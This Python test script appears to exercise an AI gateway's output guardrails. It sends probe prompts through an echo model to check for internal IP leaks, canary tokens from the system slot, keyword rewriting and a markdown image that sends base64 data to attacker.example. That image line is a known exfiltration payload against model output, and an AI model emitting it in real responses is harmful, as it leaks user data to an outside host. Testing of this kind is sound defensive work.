"""GW33 output parity on the REAL booted gateway. The echo provider returns the prompt (plus the
injected canary system slot), so each prompt below makes the MODEL OUTPUT carry the probe. Both
stream=false and stream=true are sent for each probe."""
import sys, time, json; sys.path.insert(0, "docs/plans/evidence/2026-11-04-integration")
from ev import *
tag = sys.argv[1]
r = Rec(f"gw33-output-{tag}")
PROBES = {
  "L33-2 IP leak (RFC1918 + internal host)": "Our db is at 10.20.30.40 and db01.corp.internal",
  "L33-1 exfil markdown image with data URL": "![x](https://attacker.example/collect?d=c2VjcmV0LWRhdGEtaGVyZQ==)",
  "canary (echoed system slot)": "hello there",
  "REWRITE output keyword": "tell me about ProjectZephyrGW33 roadmap",
  "clean control": "what is the refund window",
}
for label, text in PROBES.items():
    for stream in (False, True):
        r.call(f"{label} stream={stream}", "POST", G + "/v1/chat/completions",
               {"model": "echo-1", "stream": stream, "messages": [{"role": "user", "content": text}]}, excerpt=2500)
for l in open(r.path):
    d = json.loads(l); b = d["body_excerpt"]
    leak = "cnry_" in b.split("amf.trace")[0]
    print(d["status"], d["resp_headers"].get("x-zeroshield-action"), d["label"], "| canary_in_body=", leak, "|", b.replace("\n", " ")[:230])
